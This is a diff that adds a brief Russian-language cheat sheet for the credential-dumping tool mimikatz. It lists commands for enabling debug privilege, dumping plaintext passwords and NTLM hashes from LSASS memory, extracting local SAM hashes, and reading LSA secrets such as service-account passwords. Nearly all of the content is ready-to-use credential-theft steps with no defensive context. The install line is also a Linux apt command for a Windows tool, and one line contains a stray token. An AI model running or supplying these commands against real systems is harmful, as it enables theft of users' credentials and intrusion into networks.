@@ -1,0 +1,21 @@
+mimikatz 
+
+sudo apt install mimikatz -y
+
+privilege::debug
+
+
+
+Дамп всех паролей и хэшей из памяти (LSASS):
+Выводит plaintext-пароли  NTLM-хэши всех вошедших в систему пользователей.text
+sekurlsa::logonpasswords
+
+
+
+Извлечение хэшей локальных пользователей (из SAM)
+lsadump::sam
+
+
+
+Чтение секретов LSA (пароли сервисных учетных записей):
+lsadump::secrets
